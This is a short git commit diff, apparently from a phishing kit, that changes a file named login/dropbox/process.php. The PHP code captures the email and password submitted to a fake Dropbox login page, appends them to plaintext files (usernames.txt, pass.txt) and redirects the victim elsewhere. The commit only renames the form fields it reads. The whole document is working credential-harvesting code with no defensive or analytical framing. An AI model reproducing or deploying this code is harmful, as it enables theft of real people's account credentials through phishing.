ecd611b647415ae2323e715af7327134520034aa
Alygnt <mralygnt@gmail.com>
2024-07-21 00:21:12 +0530

    patch backup

--- login/dropbox/process.php
+++ login/dropbox/process.php
@@ -1,8 +1,8 @@
 <?php
 
-file_put_contents("usernames.txt", "DropBox Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "DropBox Username : " . $email = $_POST['login_email'] . "\n", FILE_APPEND);
 ?>
 <?php
-file_put_contents("pass.txt", "DropBox Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("pass.txt", "DropBox Password : " . $pass = $_POST['login_password'] . "\n", FILE_APPEND);
 header('Location: redirecturl');
 ?>
